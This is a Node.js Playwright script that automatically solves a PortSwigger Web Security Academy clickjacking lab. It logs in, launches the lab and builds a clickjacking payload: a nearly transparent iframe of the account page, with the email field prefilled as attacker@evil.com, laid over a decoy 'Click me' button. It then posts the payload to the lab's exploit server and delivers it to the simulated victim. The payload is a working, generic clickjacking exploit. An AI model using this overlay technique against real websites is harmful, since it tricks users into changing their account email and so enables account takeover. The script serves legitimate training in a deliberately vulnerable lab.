const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;

async function main() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const page = await browser.newPage();
  
  // Login
  await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
  await page.fill('#EmailAddress', EMAIL);
  await page.fill('#Password', PASSWORD);
  await Promise.all([
    page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
    page.click('#Login'),
  ]);
  
  // Launch lab
  await page.goto('https://portswigger.net/web-security/clickjacking/lab-form-input-data-prefilled', { waitUntil: 'networkidle', timeout: 30000 });
  const launchLink = await page.$('a[href*="labs/launch"]');
  if (!launchLink) { console.log('No launch link'); await browser.close(); return; }
  
  await page.goto('https://portswigger.net' + (await launchLink.getAttribute('href')), { waitUntil: 'domcontentloaded', timeout: 60000 });
  await page.waitForTimeout(45000);
  const base = new URL(page.url()).origin;
  console.log('Lab URL:', base);
  
  // Clickjacking exploit: create iframe overlay
  const exploit = `
<style>
  iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
  div { position:absolute; top:460px; left:80px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="${base}/my-account?email=attacker@evil.com"></iframe>`;
  
  // Deliver exploit via exploit server
  await page.goto(base, { waitUntil: 'networkidle', timeout: 30000 });
  const exploitLink = await page.$('a[href*="exploit-server"]');
  if (exploitLink) {
    await page.goto('https://portswigger.net' + (await exploitLink.getAttribute('href')), { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('textarea[name="responseBody"]', exploit);
    await page.click('button[type="submit"]');
    await page.waitForTimeout(2000);
    
    // Deliver to victim
    const deliverBtn = await page.$('button:has-text("Deliver to victim")');
    if (deliverBtn) await deliverBtn.click();
    await page.waitForTimeout(5000);
  }
  
  // Check solved
  await page.goto(base, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const body = await page.textContent('body').catch(() => '');
  console.log('SOLVED:', body.toLowerCase().includes('congratulations'));
  
  await browser.close();
}

main().catch(e => console.error(e.message));
